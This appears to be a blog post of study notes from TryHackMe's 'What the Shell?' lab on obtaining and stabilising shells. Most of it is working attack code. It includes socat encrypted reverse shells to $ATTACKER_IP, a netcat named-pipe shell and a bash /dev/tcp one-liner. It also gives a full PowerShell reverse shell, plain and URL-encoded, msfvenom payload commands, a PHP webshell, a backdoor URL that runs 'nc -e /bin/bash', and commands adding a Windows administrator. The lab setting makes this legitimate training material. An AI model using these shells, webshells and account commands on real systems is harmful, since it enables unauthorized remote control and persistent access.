---
title: 'TryHackMe: Complete Beginner'
date: 2021-10-28 12:00:00.000000000 Z
layout: post-external
original_link: https://cardboard-iguana.com/log/2021-10-28-tryhackme-complete-beginner.html
author: 100007
---

# What the Shell?

## Socat Encrypted Shells

Socat can also make encrypted connections, which foil after-the-fact network analysis and may circumvent IDS entirely.

```
# Generate a self-signed certificate.
#
openssl req -newkey rsa:2048 \
            -nodes \
            -keyout shell.key \
            -x509 \
            -days 362 \
            -out shell.crt

# Create a PEM file combining the certificate and key.
#
cat shell.key shell.crt > shell.pem

# Start a listener.
#
socat \
OPENSSL-LISTEN:$LISTENER_PORT,cert=shell.pem,verify=0 -

# Start the reverse shell on the target.
#
socat \
OPENSSL:$ATTACKER_IP:$LISTENER_PORT,verify=0 \
EXEC:"/bin/bash -li"
```

The PEM file needs to be generated on whichever system is listening, so for a bind shell the first two steps will need to be done on the target instead of the attacker. The `verify=0` directive turns off certificate validation, so this isn’t a “secure” connection in the sense that it’s been _authenticated_, but it is secure in the sense that it’s _encrypted_.

Since Windows doesn’t have an OpenSSL binary installed by default, it will generally be necessary to copy the PEM file across from the attacker.

Auto-stabilized shell using encryption (UNIX-like targets only):

```
# Attacker: Connect $LISTENER_PORT to the current TTY,
# send raw keycodes, and turn off terminal echo.
# Basically the `stty raw -echo`.
#
socat \
OPENSSL-LISTEN:$LISTENER_PORT,cert=shell.pem,verify=0 \
FILE:`tty`,raw,echo=0

# Target: Connect the listener on the attacker to an
# interactive login bash shell.
#
# pty - allocate a PTTY
# stderr - redirect STDERR to the attacker
# sigint - pass signals (Ctrl+C) through
# setsid - use a new session
# sane - use a variety of tweaks to "normalize" the
# terminal's environment
#
socat \
OPENSSL:$ATTACKER_IP:$LISTENER_PORT,verify=0 \
EXEC:"/bin/bash -li",pty,stderr,sigint,setsid,sane
```

## Common Shell Payloads

Pre-compiled, statically-linked Windows binaries for red teaming can be found in /usr/share/windows-binaries.

Because the `-e` switch is considered insecure (for the very reasons we’re fond of it), many UNIX-like operating systems ship a version of netcat without it. Working around this leads to the common named pipe pattern:

```
mkfifo /tmp/p
nc -lvnp $LISTENER_PORT < /tmp/p | /bin/sh >/tmp/p 2>&1
rm /tmp/p
```

(This example creates a bind shell, but we’ve also seen examples that create reverse shells. Note that it’s also possible to reverse the /bin/sh and nc portions of things; what important is that the named pipe lets us loop I/O between the two applications.)

You can do the same thing with PowerShell to create a reverse shell, albeit with a much more cryptic command.

```
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<IP>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

Note that `<IP>` and `<PORT>` need to be appropriately replaced in the above code.

- [2021-10-02 - TryHackMe: Complete Beginner](https://cardboard-iguana.com/log/2021-10-02-tryhackme-complete-beginner.html)
- [PayloadsAllTheThings Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

## msfvenom

Definitions:

- STAGED payloads use an initial stage whose job it is to establish a reverse connection and then load the actual shell code (the second stage) into memory. This helps minimize initial payload size and evade IDS, but tends to require more specialized code. Metasploit multi/handler + Meterpreter use this approach.
- STAGELESS payloads are one-stop shops - basically, everything we’ve been working with outside of Metasploit falls in this bucket. Easier to work with and understand, but bulkier and more likely to trigger alarms.

As memory scanning has become more common, staged payloads have lost some of their alure.

Fortunately (unfortunately?) msfvenom will automate our reverse shell needs. It can, among other things, generate Windows executables that will set up a reverse shell for you.

```
msfvenom -p windows/x64/shell/reverse_tcp \
         -f exe -o shell.exe \
         LHOST=$ATTACKER_IP LPORT=$LISTENER_PORT
```

The payload (`-p`) switch takes a Metasploit payload name. Payloads follow the OS/ARCHITECTURE/PAYLOAD (though ARCHITECTURE is not included for 32-bit Windows payloads). Staged payloads replace the first `_` with a `/`, so windows/x64/shell/reverse\_tcp is a staged while windows/x64/shell\_revers\_tcp is stageless.

List all available payloads using `msfvenom --list payloads`.

Interestingly, Metasploit/Meterpeter shells are banned from som certification examinations. I guess because they’re just too powerful.

## Metasploit Multi/Handler

Be sure to set the right PAYLOAD when using multi/handler!

## WebShells

Webshells are shells that run within a webserver, typically receiving input via GET variables or a form, and outputting to the page HTML. So, the simplest (PHP) web shell might be:

```
<?php
	echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>";
?>
```

Web shells are, by their nature, non-interactive.

Check out /usr/share/webshells on Kali Linux for some example webshells. In general, the most capable webshells only work on UNIX-like systems. For Windows systems, webshells are normally only a stepping stone to a normal reverse shell.

## Next Steps

Adding a user on Windows (once you have access to SYSTEM or an administrator account):

```
net user $USERNAME $PASSWORD /add
net localgroup administrators $USERNAME /add
```

In general, you don’t want to stay in reverse-shell land any longer than you have to.

## Linux Practice Box

> Try uploading a webshell to the Linux box, then use the command: `nc <LOCAL-IP> <PORT> -e /bin/bash` to send a reverse shell back to a waiting listener on your own machine.

Use /usr/share/webshells/php/simple-backdoor.php, and then go to this URL: `http://10.10.106.112/uploads/simple-backdoor.php?cmd=nc%20<IP>%20<PORT>%20-e%20/bin/bash` (where I’m redacting my `<IP>` and `<PORT>`).

> Navigate to `/usr/share/webshells/php/php-reverse-shell.php` in Kali Linux and change the IP and port to match your tun0 IP with a custom port. Set up a netcat listener, then upload and activate the shell.

Much more comfy. I hadn’t realized before how much nicer this reverse shell is than what we typically use.

Also, one big reason to want to “stabilize” a reverse shell - to get tab completion!

> Log into the Linux machine over SSH using the provided credentials. Use the `mkfifo` method to experiment with bind and reverse netcat shells.

Remember, `-l` and `-p` are for _listners_!

> Practice reverse and bind shells using Socat on the Linux machine. Try both the normal and special techniques.

Okay, the auto-stabilized socat shells are pretty freakin’ cool.

…Also, I’m really not sure why socat’s syntax is considered that much harder. It’s pretty readable.

> Look through PayloadsAllTheThings and try some of the other reverse shell techniques. Try to analyze them and see _why_ they work.

If you have access to bash with the virtual /dev/tcp device (this actually live in bash, not in /dev) then this is a pretty handy reverse shell:

```
bash -li &> /dev/tcp/$ATTACKER_IP/$LISTENER_PORT 0>&1
```

Catch it with netcat or socat.

(That said, the fact that all of my file descriptors wind up pointing at /dev/tcp is a little mysterious to me. I _think_ what’s happening here is that /dev/tcp is bidirectional “out of the box” - incoming data comes out, just as outgoing data goes in - so binding all three “core” file descriptors to it does the right thing. That, and realize that the `X>&Y` construct means “bind file descriptor X to file descriptor Y”, and `&>` is just short for `2>&1 >`, and `>` is just short for `1 >`. So really what’s happening here is that we bind STDERR to STDOUT with and implicit `2>&1`, then bind STDOUT to /dev/tcp with an implicit `1 >`, then bind STDIN to /dev/tcp as well with `0>&1`.)

- [PayloadsAllTheThings Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- [Using “netcat”](https://cardboard-iguana.com/notes/netcat.html)
- [Using “socat”](https://cardboard-iguana.com/notes/socat.html)

## Windows Practice Box

> Try uploading and activating the `php-reverse-shell`. Does this work?

Unsurprisingly, `php-reverse-shell.php` does _not_ work on a Windows box.

> Upload a webshell on the Windows target and try to obtain a reverse shell using Powershell.

Evil, URL-encoded version of the PowerShell reverse shell from above:

```
powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22
```

Remember to replace `<IP>` and `<PORT>`.

One annoying thing about this reverse shell… There’s no initial prompt, so you have no idea whether you’ve connected or not. but as soon as you enter a command (`whoami`, etc.), a prompt will appear after the output. On the plus side, however, this reverse shell will persist even after the PHP script times out!

> The webserver is running with SYSTEM privileges. Create a new user and add it to the “administrators” group, then login over RDP.

Use:

```
net user $USERNAME $PASSWORD /add
net localgroup administrators $USERNAME /add
```

It’s worth noting that users added via `net user` seem to bypass Windows’ password policies…

It seems that xfreerdp is installed on Kali Linux, so we can connect from there.

```
xfreerdp /dynamic-resolution \
         +clipboard \
         /cert:ignore \
         /v:$TARGET_IP \
         /u:$USER \
         /p:$PASSWORD
```

> Experiment using socat and netcat to obtain reverse and bind shells on the Windows Target.

It doesn’t look like _either_ socat or netcat are installed on this server (contrary to what the exercise states). However, uploading /usr/share/windows-binaries/nc.exe at least gives us netcat (and running PowerShell using the `-e powershell.exe` switch works fine).

> Create a 64bit Windows Meterpreter shell using msfvenom and upload it to the Windows Target. Activate the shell and catch it with multi/handler. Experiment with the features of this shell.

In practice, this is going to require uploading both a simple webshell _and_ the relevant msfvenom payload (it’s also possible to start the Meterpreter payloads using the RDP session fired up above, but this seems less useful).

> Create both staged and stageless meterpreter shells for either target. Upload and manually activate them, catching the shell with netcat - does this work?

Unsurprisingly, neither version of Meterpreter works, though netcat at least catches an incoming connection in both cases.

